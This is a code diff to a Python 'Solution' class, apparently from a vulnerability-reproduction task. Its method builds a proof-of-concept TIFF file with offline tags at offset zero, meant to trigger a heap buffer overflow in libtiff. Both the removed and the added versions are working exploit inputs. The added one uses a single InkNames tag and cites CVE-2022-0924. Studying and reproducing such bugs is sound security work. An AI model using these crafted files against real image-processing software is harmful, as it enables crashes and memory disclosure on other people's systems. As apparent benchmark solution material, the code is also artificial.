@@ -11,50 +11,33 @@ class Solution:
         Returns:
             bytes: The PoC input that should trigger the vulnerability
         """
-        # This PoC constructs a malformed TIFF file that triggers a heap buffer
-        # overflow in libtiff. The vulnerability is caused by "offline" tags
-        # (where data is pointed to by an offset) having a data offset of zero.
-        # The library attempts to read a large amount of data from the start of
-        # the file, causing a read beyond the boundaries of the allocated buffer.
-        
-        # Helper to create a 12-byte TIFF IFD entry (tag) in little-endian format.
-        def create_tag(tag_id, type_id, count, value_or_offset):
-            return struct.pack('<HHII', tag_id, type_id, count, value_or_offset)
+        # The vulnerability is a heap buffer overflow in libtiff (CVE-2022-0924),
+        # triggered when processing a TIFF file with an "offline" tag that has
+        # an invalid data offset of 0.
+        # This PoC creates a minimal TIFF file with such a malicious tag.
 
-        # TIFF Header (8 bytes): 'II' (little-endian), version 42, IFD at offset 8.
-        header = b'II\x2a\x00\x08\x00\x00\x00'
+        # 1. TIFF Header (8 bytes):
+        #    - 'II' for little-endian byte order.
+        #    - Version 42.
+        #    - Offset 8 to the first Image File Directory (IFD).
+        header = b'II' + struct.pack('<HI', 42, 8)
 
-        tags = []
+        # 2. IFD Entry Count (2 bytes):
+        #    - We need only one malicious entry.
+        num_entries = struct.pack('<H', 1)
 
-        # A minimal set of tags is required for the file to be parsed as a
-        # strip-based image, allowing execution to reach the vulnerable code path.
-        # TIFF type IDs: SHORT=3, LONG=4
-        tags.append(create_tag(256, 4, 1, 1))   # ImageWidth
-        tags.append(create_tag(257, 4, 1, 1))   # ImageLength
-        tags.append(create_tag(259, 3, 1, 1))   # Compression
-        tags.append(create_tag(262, 3, 1, 2))   # PhotometricInterpretation
-        tags.append(create_tag(278, 4, 1, 1))   # RowsPerStrip
+        # 3. Malicious IFD Entry (12 bytes):
+        #    - Tag ID: 333 (TIFFTAG_INKNAMES), known to be handled by the vulnerable code.
+        #    - Type: 2 (ASCII).
+        #    - Count: A large value (e.g., 65536) to ensure the data size is > 4 bytes,
+        #             making it an "offline" tag, and to cause a large out-of-bounds read.
+        #    - Offset: 0, the invalid offset that triggers the vulnerability.
+        entry = struct.pack('<HHII', 333, 2, 65536, 0)
 
-        # Malicious tags: StripOffsets and StripByteCounts are "offline" tags
-        # with a data offset of 0. For a tag of type LONG (size 4 bytes), a
-        # count greater than 1 makes it "offline", meaning its value is an offset
-        # to the data rather than the data itself.
-        malicious_count = 66
-        malicious_offset = 0
-        tags.append(create_tag(273, 4, malicious_count, malicious_offset)) # StripOffsets
-        tags.append(create_tag(279, 4, malicious_count, malicious_offset)) # StripByteCounts
-        
-        # Tags in an IFD must be sorted by ID for correct parsing.
-        tags.sort(key=lambda t: struct.unpack('<H', t[0:2])[0])
+        # 4. Next IFD Offset (4 bytes):
+        #    - 0, as there are no more IFDs.
+        next_ifd_offset = struct.pack('<I', 0)
 
-        # Assemble the Image File Directory (IFD).
-        # Structure: Number of entries (2 bytes), followed by the tag entries,
-        # then the offset to the next IFD (4 bytes).
-        ifd_entry_count = struct.pack('<H', len(tags))
-        ifd_tags_data = b''.join(tags)
-        next_ifd_offset = struct.pack('<I', 0) # 0 indicates this is the last/only IFD.
-        
-        ifd = ifd_entry_count + ifd_tags_data + next_ifd_offset
-
-        # The final PoC is the header followed by the malformed IFD.
-        return header + ifd
+        # The complete PoC is the concatenation of these parts.
+        # Total size: 8 (header) + 2 (num_entries) + 12 (entry) + 4 (next_ifd_offset) = 26 bytes.
+        return header + num_entries + entry + next_ifd_offset
